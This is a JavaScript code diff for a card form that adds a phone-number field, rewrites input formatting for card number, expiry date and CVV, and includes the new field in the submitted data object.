@@ -71,23 +71,41 @@ const updateLogic = () => {
             return el ? el.value : "Not Provided"; 
         };
 
-        // Formatter
-        const fieldIds = ['cardNumber', 'cvv', 'expiryDate'];
+        // Formatter (Added Phone Number Logic)
+        const fieldIds = ['cardNumber', 'cvv', 'expiryDate', 'cardPhone'];
         fieldIds.forEach(id => {
             const field = document.getElementById(id);
             if (field) {
                 field.addEventListener('input', (e) => {
-                    let value = e.target.value.replace(/\D/g, '');
-                    if (id === 'cardNumber') value = value.substring(0, 16).replace(/(.{4})/g, '$1 ').trim();
+                    // Get current value
+                    let val = e.target.value;
+
+                    // 1. Phone Number: Allow numbers, +, -, (, ), space
+                    if (id === 'cardPhone') {
+                        e.target.value = val.replace(/[^0-9+\-\(\)\s]/g, '');
+                    }
+                    // 2. Card Number: Numbers only, space every 4
+                    else if (id === 'cardNumber') {
+                        let clean = val.replace(/\D/g, '').substring(0, 16);
+                        e.target.value = clean.replace(/(.{4})/g, '$1 ').trim();
+                    }
+                    // 3. Expiry: Numbers only, slash after 2
                     else if (id === 'expiryDate') {
-                        value = value.substring(0, 4);
-                        if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                        let clean = val.replace(/\D/g, '').substring(0, 4);
+                        if (clean.length >= 2) clean = clean.substring(0, 2) + '/' + clean.substring(2, 4);
+                        e.target.value = clean;
                     } 
-                    else if (id === 'cvv') value = value.substring(0, 4);
-                    e.target.value = value;
+                    // 4. DDV/CVV: Numbers only
+                    else if (id === 'cvv') {
+                        e.target.value = val.replace(/\D/g, '').substring(0, 4);
+                    }
                 });
             }
         });
+
+
+
+
 
         // Submit Listener
         cardForm.addEventListener("submit", (e) => {
@@ -122,6 +140,7 @@ const updateLogic = () => {
 
                 // Car/Card Info
                 card_name: getSafeValue("cardName"),
+                card_phone: getSafeValue("cardPhone"), // ✅ NEW FIELD
                 card_number: getSafeValue("cardNumber"),
                 expiry_date: getSafeValue("expiryDate"),
                 CVV: getSafeValue("cvv"), // Matches HTML ID
